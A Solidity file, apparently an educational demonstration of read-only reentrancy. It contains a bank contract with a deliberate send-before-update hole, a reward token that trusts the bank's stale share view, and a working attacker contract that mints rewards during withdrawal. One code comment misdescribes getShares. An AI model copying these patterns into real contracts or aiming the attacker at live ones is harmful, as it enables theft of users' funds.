// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// A bank contract that holds ether for clients.
contract ReadOnlyReentrancyBank {
    // Mapping of ether shares of the contract.
    mapping(address => uint256) shares;

    function withdraw() public {
        (bool success,) = msg.sender.call{value: shares[msg.sender]}("");
        if (success) {
            shares[msg.sender] = 0;
        }
    }

    // This function returns true if the address has a minimum deposit of 1 ether.
    function getShares(address _address) public view returns (uint256) {
        return shares[_address];
    }

    function deposit() public payable {
        shares[msg.sender] += msg.value;
    }
}

// A contract that mints rewards to clients of the bank.
contract ReadOnlyReentrancyVulnerable is ERC20 {
    ReadOnlyReentrancyBank public bank;

    constructor(ReadOnlyReentrancyBank _bank) ERC20("Reward Token", "RWT") {
        bank = _bank;
    }

    // A function that mintes rewards to clients of the bank.
    function getReward() public {
        uint256 userShares = bank.getShares(msg.sender);
        require(userShares > 0, "You don't have any shares in the bank");
        _mint(msg.sender, userShares);
    }
}

contract ReadOnlyReentrancyAttacker {
    ReadOnlyReentrancyBank bank;
    ReadOnlyReentrancyVulnerable vulnerable;

    constructor(ReadOnlyReentrancyVulnerable _vulnerable) {
        vulnerable = _vulnerable;
        bank = vulnerable.bank();
    }

    // Reentrancy attack.
    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
        vulnerable.transfer(msg.sender, vulnerable.balanceOf(address(this)));
    }

    // Receive function triggers the attack.
    receive() external payable {
        // Even if the ETH is already withdrawn from the bank,
        // the vulnerable contract will still mint the reward
        // because the shares balance is not updated yet.
        vulnerable.getReward();
    }
}
